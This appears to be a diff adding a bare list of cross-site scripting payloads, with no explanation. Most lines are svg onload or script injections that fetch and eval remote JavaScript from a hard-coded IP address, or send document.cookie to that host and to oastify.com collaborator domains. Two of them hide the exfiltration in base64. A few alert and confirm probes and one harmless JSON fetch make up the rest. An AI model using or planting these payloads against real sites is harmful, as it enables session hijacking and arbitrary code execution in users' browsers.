@@ -1,0 +1,23 @@
+<svg onload='fetch("http://147.45.143.202:8000/evil.js").then(r=>r.text().then(t=>eval(t)))'>
+<svg/onload='fetch("http://147.45.143.202:8000/xss.js").then(r=>r.text().then(t=>eval(t)))'>
+<svg/onload='console.log(fetch("http://147.45.143.202:8000/evil.js"))'>
+<a id = "x"></a><svg/onload="eval(fetch('http://147.45.143.202:8000/xss.js?c-='+document.cookie));">
+
+<svg/onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly8xNDcuNDUuMTQzLjIwMjo4MDAwL3hzcy5qcz9jLT0nK2RvY3VtZW50LmNvb2tpZSk='))">
+<svg/onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly9yODAyZzkyMXNlYmtnZGo5aXZ2ZzN5cnE0aGFheTNtcy5vYXN0aWZ5LmNvbT9jLT0nK2RvY3VtZW50LmNvb2tpZSk='))">
+
+
+
+fetch(`./fr.json`, {headers : { 'Content-Type': 'application/json','Accept': 'application/json'}})
+    .then((response) => response.json())
+    .then((messages) => {console.log("messages");});
+
+<script>document.location="http://uig5qcc42hlnqgtcsy5jd11tekkd85wu.oastify.com?c="+document.cookie</script>
+
+<script>alert('1')</script>
+
+<embed src="https://gist.github.com/vv=v<script>console.log(42)</script>"> ?
+
+<svg/onrandom=random onload=confirm(1)>
+
+http://147.45.143.202:8000/evil.js
